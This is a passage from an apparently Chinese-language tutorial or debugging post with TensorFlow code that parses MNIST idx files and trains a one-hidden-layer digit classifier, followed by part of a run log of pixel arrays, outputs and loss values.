unsinged int32\n        magic_number, num_images, num_rows, num_cols = struct.unpack_from(fmt_header, fb_data, offset)\n        print('idex3 魔数：{}，图片数：{}'.format(magic_number, num_images))\n        offset += struct.calcsize(fmt_header)\n        fmt_image = '>' + str(num_rows * num_cols) + 'B'\n\n        images = np.empty((num_images, num_rows*num_cols)) #做了修改\n        for i in range(num_images):\n            im = struct.unpack_from(fmt_image, fb_data, offset)\n            images[i] = np.array(im)#这里用一维数组表示图片，np.array(im).reshape((num_rows, num_cols))\n            offset += struct.calcsize(fmt_image)\n        return images\n    def decode_idx1_ubyte(self,idx1_ubyte_file):\n        with open(idx1_ubyte_file, 'rb') as f:\n            print('解析文件：', idx1_ubyte_file)\n            fb_data = f.read()\n\n        offset = 0\n        fmt_header = '>ii'  # 以大端法读取两个 unsinged int32\n        magic_number, label_num = struct.unpack_from(fmt_header, fb_data, offset)\n        print('idex1 魔数：{}，标签数：{}'.format(magic_number, label_num))\n        offset += struct.calcsize(fmt_header)\n        labels = np.empty(shape=[0,10],dtype=float) #神经网络需要把label变成10位float的数组\n\n        fmt_label = '>B'    # 每次读取一个 byte\n        for i in range(label_num):\n            n=struct.unpack_from(fmt_label, fb_data, offset)\n            labels=np.append(labels,[[0,0,0,0,0,0,0,0,0,0]],axis=0)\n            labels[i][n]=1\n            offset += struct.calcsize(fmt_label)\n        return labels  \n\n    def __init__(self):\n        #固定的训练文件位置\n        self.img=self.decode_idx3_ubyte(\"/home/zhangyl/Downloads/mnist/train-images.idx3-ubyte\")\n        self.result=self.decode_idx1_ubyte(\"/home/zhangyl/Downloads/mnist/train-labels.idx1-ubyte\")\n\n        print(self.result[0])\n        print(self.result[1000])\n        print(self.result[25000])\n        #固定的验证文件位置\n        self.validate_img=self.decode_idx3_ubyte(\"/home/zhangyl/Downloads/mnist/t10k-images.idx3-ubyte\")\n        self.validate_result=self.decode_idx1_ubyte(\"/home/zhangyl/Downloads/mnist/t10k-labels.idx1-ubyte\")\n        #每一批读训练数据的起始位置\n        self.train_read_addr=0\n        #每一批读训练数据的batchsize\n        self.train_batchsize=100\n        #每一批读验证数据的起始位置\n        self.validate_read_addr=0\n        #每一批读验证数据的batchsize\n        self.validate_batchsize=100\n        #定义用于返回batch数据的变量\n        self.train_img_batch=self.img\n        self.train_result_batch=self.result\n        self.validate_img_batch=self.validate_img\n        self.validate_result_batch=self.validate_result\n\n    def get_next_batch_traindata(self):\n        n=len(self.img) #对参数范围适当约束\n        if self.train_read_addr+self.train_batchsize<=n :\n            self.train_img_batch=self.img[self.train_read_addr:self.train_read_addr+self.train_batchsize]\n            self.train_result_batch=self.result[self.train_read_addr:self.train_read_addr+self.train_batchsize]\n            self.train_read_addr+=self.train_batchsize #改变起始位置\n            if self.train_read_addr==n :\n                self.train_read_addr=0\n        else:\n            self.train_img_batch=self.img[self.train_read_addr:n]\n            self.train_img_batch.append(self.img[0:self.train_read_addr+self.train_batchsize-n])\n            self.train_result_batch=self.result[self.train_read_addr:n]\n            self.train_result_batch.append(self.result[0:self.train_read_addr+self.train_batchsize-n])\n            self.train_read_addr=self.train_read_addr+self.train_batchsize-n #改变起始位置,这里没考虑batchsize大于n的情形\n        return self.train_img_batch,self.train_result_batch #测试一下用临时变量返回是否可行\n\n\n    def set_train_read_addr(self,addr):\n        self.train_read_addr=addr\n    def set_train_batchsize(self,batchsize):\n        self.train_batchsize=batchsize\n        if batchsize <1 :\n            self.train_batchsize=1\n    def set_validate_read_addr(self,addr):\n        self.validate_read_addr=addr\n    def set_validate_batchsize(self,batchsize):\n        self.validate_batchsize=batchsize\n        if batchsize<1 :\n            self.validate_batchsize=1\n\nmyminst=MyMinst() #minst类的实例\nbatch_size=2  #设置每一轮训练的Batch大小\nlearning_rate=0.8 #初始学习率\nlearning_rate_decay=0.999 #学习率的衰减\nmax_steps=300000 #最大训练步数\n\n#定义存储训练轮数的变量，在使用tensorflow训练神经网络时，\n#一般会将代表训练轮数的变量通过trainable参数设置为不可训练的\ntraining_step = tf.Variable(0,trainable=False)\n\n#定义得到隐藏层和输出层的前向传播计算方式，激活函数使用relu()\ndef hidden_layer(input_tensor,weights1,biases1,weights2,biases2,layer_name):\n    layer1=tf.nn.relu(tf.matmul(input_tensor,weights1)+biases1)\n    return tf.matmul(layer1,weights2)+biases2\n\nx=tf.placeholder(tf.float32,[None,784],name=\"x-input\")\ny_=tf.placeholder(tf.float32,[None,10],name=\"y-output\")\n\n#生成隐藏层参数，其中weights包含784*500=39200个参数\nweights1=tf.Variable(tf.truncated_normal([784,500],stddev=0.1))\nbiases1=tf.Variable(tf.constant(0.1,shape=[500]))\n\n#生成输出层参数，其中weights2包含500*10=5000个参数\nweights2=tf.Variable(tf.truncated_normal([500,10],stddev=0.1))\nbiases2=tf.Variable(tf.constant(0.1,shape=[10]))\n\n#计算经过神经网络前后向传播后得到的y值\ny=hidden_layer(x,weights1,biases1,weights2,biases2,'y')\n\n#初始化一个滑动平均类，衰减率为0.99\n#为了使模型在训练前期可以更新的更快，这里提供了num_updates参数，并设置为当前网络的训练轮数\n#averages_class=tf.train.ExponentialMovingAverage(0.99,training_step)\n\n#定义一个更新变量滑动平均值的操作需要向滑动平均类的apply()函数提供一个参数列表\n#train_variables()函数返回集合图上Graph.TRAINABLE_VARIABLES中的元素。\n#这个集合的元素就是所有没有指定trainable_variables=False的参数\n#averages_op=averages_class.apply(tf.trainable_variables())\n\n#再次计算经过神经网络前向传播后得到的y值，这里使用了滑动平均，但要牢记滑动平均值只是一个影子变量\n#average_y=hidden_layer(x,averages_class.average(weights1),\n #                        averages_class.average(biases1),\n  #                       averages_class.average(weights2),\n   #                      averages_class.average(biases2),\n    #                     'average_y')\n\n#softmax,计算交叉熵损失，L2正则，随机梯度优化器，学习率采用指数衰减\n\n#函数原型为sparse_softmax_cross_entropy_with_logits(_sential,labels,logdits,name)\n#与softmax_cross_entropy_with_logits()函数的计算方式相同，更适用于每个类别相互独立且排斥\n#的情况，即每一幅图只能属于一类\n#在1.0.0版本的TensorFlow中，这个函数只能通过命名参数的方式来使用，在这里logits参数是神经网\n#络不包括softmax层的前向传播结果,lables参数给出了训练数据的正确答案\nsoftmax=tf.nn.softmax(y)\ncross_entropy=tf.nn.sparse_softmax_cross_entropy_with_logits(logits=y+1e-10,labels=tf.argmax(y_,1))\n\n#argmax()函数原型为argmax(input,axis,name,dimension)用于计算每一个样例的预测答案，其中\n# input参数y是一个batch_size*10(batch_size行，10列)的二维数组。每一行表示一个样例前向传\n# 播的结果，axis参数“1”表示选取最大值的操作只在第一个维度进行。即只在每一行选取最大值对应的下标\n# 于是得到的结果是一个长度为batch_size的一维数组，这个一维数组的值就表示了每一个样例的数字识别\n# 结果。\n\nregularizer=tf.contrib.layers.l2_regularizer(0.0001)\n                        #计算L2正则化损失函数\nregularization=regularizer(weights1)+regularizer(weights2)\n                        #计算模型的正则化损失\nloss=tf.reduce_mean(cross_entropy)#+regularization\n                        #总损失\n\n#用指数衰减法设置学习率，这里staircase参数采用默认的False,即学习率连续衰减\nlearning_rate=tf.train.exponential_decay(learning_rate,training_step,\n                                        batch_size,learning_rate_decay)\n\n#使用GradientDescentOptimizer优化算法来优化交叉熵损失和正则化损失\ntrain_op=tf.train.GradientDescentOptimizer(learning_rate).minimize(loss,\n                                                             global_step=training_step)\n\n#在训练这个模型时，每过一遍数据既需要通过反向传播来更新神经网络中的参数，又需要\n# 更新每一个参数的滑动平均值。control_dependencies()用于这样的一次性多次操作\n#同样的操作也可以使用下面这行代码完成：\n#train_op=tf.group(train_step,average_op)\n#with tf.control_dependencies([train_step,averages_op]):\n #            train_op=tf.no_op(name=\"train\")\n\n#检查使用了滑动平均模型的神经网络前向传播结果是否正确\n#equal()函数原型为equal(x,y,name)，用于判断两个张量的每一维是否相等。\n#如果相等返回True，否则返回False\ncrorent_predicition=tf.equal(tf.argmax(y,1),tf.argmax(y_,1))\n\n#cast()函数的原型为cast(x,DstT,name),在这里用于将一个布尔型的数据转换为float32类型\n#之后对得到的float32型数据求平均值，这个平均值就是模型在这一组数据上的正确率\naccuracy=tf.reduce_mean(tf.cast(crorent_predicition,tf.float32))\n\n#创建会话和开始训练过程\nwith tf.Session() as sess:\n    #在稍早的版本中一般使用initialize_all_variables()函数初始化全部变量\n    tf.global_variables_initializer().run()\n\n    #准备验证数据\n    validate_feed={x:myminst.validate_img,y_:myminst.validate_result}\n    #准备测试数据\n    test_feed= {x:myminst.img,y_:myminst.result}\n\n    for i in range(max_steps):\n        if i%1000==0:\n            #计算滑动平均模型在验证数据上的结果\n            #为了能得到百分数输出，需要将得到的validate_accuracy扩大100倍\n            validate_accuracy= sess.run(accuracy,feed_dict=validate_feed)\n            print(\"After %d trainning steps,validation accuracy using average model is %g%%\" %(i,validate_accuracy*100))\n\n#产生这一轮使用一个batch的训练数据，并进行训练\n        #input_data.read_data_sets（）函数生成的类提供了train.next_batch()函数\n        #通过设置函数的batch_size参数就可以从所有的训练数据中读取一个小部分作为一个训练batch\n        myminst.set_train_batchsize(batch_size)\n        xs,ys=myminst.get_next_batch_traindata()\n        var_print=sess.run([x,y,y_,loss,train_op,softmax,cross_entropy,regularization,weights1],feed_dict={x:xs,y_:ys})\n        print(\"after \",i,\" trainning steps:\")\n        print(\"x=\",var_print[0][0],var_print[0][1],\"y=\",var_print[1],\"y_=\",var_print[2],\"loss=\",var_print[3],\n\"softmax=\",var_print[5],\"cross_entropy=\",var_print[6],\"regularization=\",var_print[7],var_print[7])\n        time.sleep(0.5)    \n\n    #使用测试数据集检验神经网络训练之后的正确率\n    #为了能得到百分数输出，需要将得到的test_accuracy扩大100倍\n    test_accuracy=sess.run(accuracy,feed_dict=test_feed)\n    print(\"After %d training steps,test accuracy using average model is %g%%\"%(max_steps,test_accuracy*100))\n\n下面是运行情况的一部分：\nx= [ 0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  8. 76. 202. 254.\n 255. 163. 37.  2.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 13. 182. 253. 253. 253.\n 253. 253. 253. 23.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 15. 179. 253. 253. 212. 91.\n 218. 253. 253. 179. 109.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 105. 253. 253. 160. 35. 156.\n 253. 253. 253. 253. 250. 113.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 19. 212. 253. 253. 88. 121. 253.\n 233. 128. 91. 245. 253. 248. 114.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 104. 253. 253. 110.  2. 142. 253.\n 90.  0.  0. 26. 199. 253. 248. 63.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  1. 173. 253. 253. 29.  0. 84. 228.\n 39.  0.  0.  0. 72. 251. 253. 215. 29.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0. 36. 253. 253. 203. 13.  0.  0.  0.\n  0.  0.  0.  0.  0. 82. 253. 253. 170.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0. 36. 253. 253. 164.  0.  0.  0.  0.\n  0.  0.  0.  0.  0. 11. 198. 253. 184.  6.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0. 36. 253. 253. 82.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0. 138. 253. 253. 35.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0. 128. 253. 253. 47.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0. 48. 253. 253. 35.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0. 154. 253. 253. 47.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0. 48. 253. 253. 35.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0. 102. 253. 253. 99.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0. 48. 253. 253. 35.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0. 36. 253. 253. 164.  0.  0.  0.  0.\n  0.  0.  0.  0.  0. 16. 208. 253. 211. 17.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0. 32. 244. 253. 175.  4.  0.  0.  0.\n  0.  0.  0.  0.  0. 44. 253. 253. 156.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 171. 253. 253. 29.  0.  0.  0.\n  0.  0.  0.  0. 30. 217. 253. 188. 19.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 171. 253. 253. 59.  0.  0.  0.\n  0.  0.  0. 60. 217. 253. 253. 70.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 78. 253. 253. 231. 48.  0.  0.\n  0. 26. 128. 249. 253. 244. 94. 15.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  8. 151. 253. 253. 234. 101. 121.\n 219. 229. 253. 253. 201. 80.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 38. 232. 253. 253. 253. 253.\n 253. 253. 253. 201. 66.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.] [ 0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 232. 253. 253. 95.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  3. 86. 46.\n  0.  0.  0.  0.  0.  0. 91. 246. 252. 232. 57.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 103. 252. 187.\n 13.  0.  0.  0.  0. 22. 219. 252. 252. 175.  0.  0.  0.  0.\n  0.  0.  0.  0.  0. 10.  0.  0.  0.  0.  8. 181. 252. 246.\n 30.  0.  0.  0.  0. 65. 252. 237. 197. 64.  0.  0.  0.  0.\n  0.  0.  0.  0.  0. 87.  0.  0.  0. 13. 172. 252. 252. 104.\n  0.  0.  0.  0.  5. 184. 252. 67. 103.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  8. 172. 252. 248. 145. 14.\n  0.  0.  0.  0. 109. 252. 183. 137. 64.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  5. 224. 252. 248. 134.  0.  0.\n  0.  0.  0. 53. 238. 252. 245. 86.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0. 12. 174. 252. 223. 88.  0.  0.  0.\n  0.  0.  0. 209. 252. 252. 179.  9.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0. 11. 171. 252. 246. 61.  0.  0.  0.  0.\n  0.  0. 83. 241. 252. 211. 14.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0. 129. 252. 252. 249. 220. 220. 215. 111. 192.\n 220. 221. 243. 252. 252. 149.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0. 144. 253. 253. 253. 253. 253. 253. 253. 253.\n 253. 255. 253. 226. 153.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0. 44. 77. 77. 77. 77. 77. 77. 77. 77.\n 153. 253. 235. 32.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 74.\n 214. 240. 114.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 24. 221.\n 243. 57.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  8. 180. 252.\n 119.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 136. 252. 153.\n  7.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  3. 136. 251. 226. 34.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 123. 252. 246. 39.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 165. 252. 127.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 165. 175.  3.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.] y= [[ 0.58273095 0.50121385 -0.74845004 0.35842288 -0.13741069 -0.5839622\n  0.2642774  0.5101677 -0.29416046 0.5471707 ]\n [ 0.58273095 0.50121385 -0.74845004 0.35842288 -0.13741069 -0.5839622\n  0.2642774  0.5101677 -0.29416046 0.5471707 ]] y_= [[1. 0. 0. 0. 0. 0. 0. 0. 0. 0.]\n [0. 0. 0. 0. 1. 0. 0. 0. 0. 0.]] loss= 2.2801425 softmax= [[0.14659645 0.13512042 0.03872566 0.11714067 0.07134604 0.04564939\n 0.10661562 0.13633572 0.06099501 0.14147504]\n [0.14659645 0.13512042 0.03872566 0.11714067 0.07134604 0.04564939\n 0.10661562 0.13633572 0.06099501 0.14147504]] cross_entropy= [1.9200717 2.6402135] regularization= 50459690000000.0 50459690000000.0\nafter 45 trainning steps:\nx= [ 0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0. 25. 214. 225. 90.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  7. 145. 212. 253. 253. 60.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0. 106. 253. 253. 246. 188. 23.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 45.\n 164. 254. 253. 223. 108.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 24. 236.\n 253. 252. 124. 28.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 100. 217. 253.\n 218. 116.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 158. 175. 225. 253.\n 92.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 24. 217. 241. 248. 114.\n  2.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 21. 201. 253. 253. 114.  3.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 107. 253. 253. 213. 19.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 170. 254. 254. 169.  0.  0.\n  0.  0.  0.  2. 13. 100. 133. 89.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 18. 210. 253. 253. 100.  0.  0.\n  0. 19. 76. 116. 253. 253. 253. 176.  4.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 41. 222. 253. 208. 18.  0.  0.\n 93. 209. 232. 217. 224. 253. 253. 241. 31.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 157. 253. 253. 229. 32.  0. 154.\n 250. 246. 36.  0. 49. 253. 253. 168.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 128. 253. 253. 253. 195. 125. 247.\n 166. 69.  0.  0. 37. 236. 253. 168.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 37. 253. 253. 253. 253. 253. 135.\n 32.  0.  7. 130. 73. 202. 253. 133.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  7. 185. 253. 253. 253. 253. 64.\n  0. 10. 210. 253. 253. 253. 153.  9.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 66. 253. 253. 253. 253. 238.\n 218. 221. 253. 253. 235. 156. 37.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  5. 111. 228. 253. 253. 253.\n 253. 254. 253. 168. 19.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  9. 110. 178. 253.\n 253. 249. 63.  5.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.] [ 0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n 121. 121. 240. 253. 218. 121. 121. 44.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 17. 107. 184. 240.\n 253. 252. 252. 252. 252. 252. 252. 219.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 75. 122. 230. 252. 252. 252.\n 253. 252. 252. 252. 252. 252. 252. 239. 56.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0. 77. 129. 213. 244. 252. 252. 252. 252. 252.\n 253. 252. 252. 209. 252. 252. 252. 225.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0. 240. 252. 252. 252. 252. 252. 252. 213. 185.\n 53. 53. 53. 89. 252. 252. 252. 120.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0. 240. 232. 198. 93. 164. 108. 66. 28.  0.\n  0.  0.  0. 81. 252. 252. 222. 24.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0. 76. 50.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0. 171. 252. 243. 108.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0. 144. 238. 252. 115.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  7. 70. 241. 248. 133. 28.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n 121. 252. 252. 172.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 64.\n 255. 253. 209. 21.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 13. 246.\n 253. 207. 21.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 10. 172. 252.\n 209. 92.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 13. 168. 252. 252.\n 92.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 43. 208. 252. 241. 53.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 15. 166. 252. 204. 62.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 13. 166. 243. 191. 29.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0. 10. 168. 231. 177. 